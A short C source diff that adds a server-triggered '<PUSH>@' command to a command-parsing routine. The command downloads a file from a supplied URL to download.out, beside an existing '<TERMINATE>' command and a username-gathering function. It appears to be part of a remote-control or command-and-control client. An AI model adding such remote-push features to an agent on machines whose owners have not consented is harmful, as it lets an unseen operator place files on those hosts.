@@ -2,6 +2,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include "downloader/downloader.h"
 
 #ifdef _WIN32
 #include <windows.h>
@@ -189,10 +190,21 @@ char *get_uname(int size_){
 	return u_name;
 }
 
+#define PUSH_PREFIX "<PUSH>@"
+#define PUSH_PREFIX_LEN (sizeof(PUSH_PREFIX) - 1)
+
 void parse_response(char *command){
 	if (strcmp(command, "<TERMINATE>") == 0){
 		exit(0);
-	} else {
+	} else if (strncmp(command, PUSH_PREFIX, PUSH_PREFIX_LEN) == 0){
+		const char *download_url = command + PUSH_PREFIX_LEN;
+		printf("%s\n", download_url);
+		if (download_file(download_url, "download.out") == 0){
+			printf("Download successful\n");
+		} else {
+			printf("Download failed\n");
+		}
+	}else {
 		printf("%s\n", command);
 	}
 }
